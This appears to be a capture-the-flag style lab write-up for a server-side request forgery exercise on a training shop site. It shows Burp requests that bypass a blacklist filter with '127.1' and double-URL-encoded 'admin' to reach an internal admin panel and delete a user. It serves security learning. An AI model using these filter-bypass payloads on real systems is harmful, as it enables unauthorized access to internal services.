# Lab 3: SSRF with blacklist-based input filter

- Vulnerability feature: stock check
- Goal: change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user carlos

### Analysis
- Open Burp Suite
```html
<!-- Request -->
stockApi=http%3a//stock.weliketoshop.net%3a8080/product/stock/check%3fproductId%3d1%26storeId%3d1

<!-- Response -->
762
```

```html
<!-- Decode -->
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1

<!-- Request -->
stockApi=http://localhost
<!-- Not work -->

stockApi=http://127.0.0.1
<!-- Still not work -->

stockApi=http://127.1

<!-- Response -->
<a href="/admin">
    Admin panel
</a>
<!-- 127.0.0.1 is localhost but 127.1 is incorrect format of IP address -->
```
```html
<!-- Request -->
stockApi=http//127.1/admin
<!-- Not work we need to encode url-->
```
- `Convert selection` > `URL` > `URL-encode all characters`
```html
<!-- Request -->
stockApi=http://127.1/%25%36%31%64min

<!-- Response -->
<a href="/admin/delete?username=carlos">
    Delete
</a>
``` 
```html
<!-- Request -->
stockApi=http://127.1/%25%36%31%64min/delete?username=carlos
``` 
- Click `Follow redirection`
- Congratulations!